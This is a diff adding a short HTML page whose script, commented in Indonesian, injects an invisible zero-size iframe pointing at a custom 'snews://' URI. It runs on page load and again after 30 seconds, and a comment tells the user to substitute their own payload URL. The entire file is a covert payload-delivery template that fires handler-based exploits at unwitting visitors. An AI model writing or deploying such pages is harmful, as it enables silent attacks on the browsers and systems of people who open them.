@@ -1,0 +1,21 @@
+<html>
+<body>
+<script>
+    // Fungsi untuk menambahkan iframe dengan payload
+    function triggerPayload() {
+        let iframe = document.createElement("iframe");
+        iframe.frameBorder = 0;
+        iframe.width = 0;
+        iframe.height = 0;
+        iframe.src = "snews://1234"; // Ganti dengan URL payload Anda
+        document.body.appendChild(iframe);
+    }
+
+    // Eksekusi payload langsung saat halaman dimuat
+    triggerPayload();
+
+    // Eksekusi payload kedua setelah 30 detik
+    setTimeout(triggerPayload, 30000);
+</script>
+</body>
+</html>
